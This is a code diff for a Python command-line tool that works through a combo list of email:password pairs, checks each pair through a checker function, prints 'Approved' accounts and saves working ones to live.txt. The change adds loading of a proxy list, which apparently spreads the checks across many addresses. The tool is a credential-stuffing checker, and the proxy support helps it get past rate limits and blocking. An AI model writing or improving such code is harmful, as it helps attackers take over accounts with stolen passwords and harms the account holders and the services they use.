@@ -1,5 +1,5 @@
 from modules.defs import Main
-from tkinter import filedialog
+from tkinter import filedialog, Tk
 from os import system, name
 import time
 
@@ -29,16 +29,28 @@ class App:
         time.sleep(2)
         defs.save_live()
         defs.save_dead()
+        defs.use_proxy()
+        if self.data['use_proxy'] == True:
+            proxy_list = filedialog.askopenfilename()
+            proxy_read = defs.read(proxy_list)
+            proxy_array = []
+            for i in proxy_read:
+                proxy_array.append(i)
+            self.data['proxy_list'] = proxy_array
         print("=>> Choose combo list text file. (email:pass) ")
         combo_list = filedialog.askopenfilename()
         combo_read = defs.read(combo_list)
+        
         for i in combo_read:
             splitted = i.split(':', 1)
             resp = defs.checker(splitted[0], splitted[1])
             data = resp['data']
             self.data['checked'] += 1
             if resp.get('process') == True:
-                print(f"\033[92mApproved =>> Email: {data['email']} | Password: {data['password']}\033[00m")
+                if self.data['use_proxy'] == False:
+                    print(f"\033[92mApproved =>> Email: {data['email']} | Password: {data['password']}\033[00m")
+                else:
+                    print(f"\033[92mApproved =>> Email: {data['email']} | Password: {data['password']} ({resp['message']})\033[00m")
                 self.data['live'] += 1
                 if self.data['save_live'] == True:
                     with open('./live.txt', 'a') as file:
